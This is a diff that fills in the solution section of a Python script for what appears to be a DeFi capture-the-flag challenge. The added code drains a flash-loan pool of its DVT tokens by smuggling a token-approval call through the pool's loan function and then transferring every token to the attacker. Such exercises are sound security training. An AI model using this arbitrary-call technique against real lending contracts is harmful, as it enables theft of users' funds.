@@ -57,9 +57,16 @@ def main():
     #############################
     ##### SOLUTION GOES HERE ####
     #############################
-    
-        
 
+    # Encode a call to the DVT contract approving the attacker to take all the tokens from the pool
+    attack_call = token.approve.encode_input(attacker.address, TOKENS_IN_POOL)
+
+    # run the flash loan borrowing 0 tokens and passing the encoded call
+    pool.flashLoan(0, pool.address, token.address, attack_call, _fromAttacker)
+
+    # take all the tokens from the pool
+    token.transferFrom(pool.address, attacker.address, TOKENS_IN_POOL, _fromAttacker)
+        
 ###############################################################
 ###################### CHECKING SOLUTION ######################
 ###############################################################
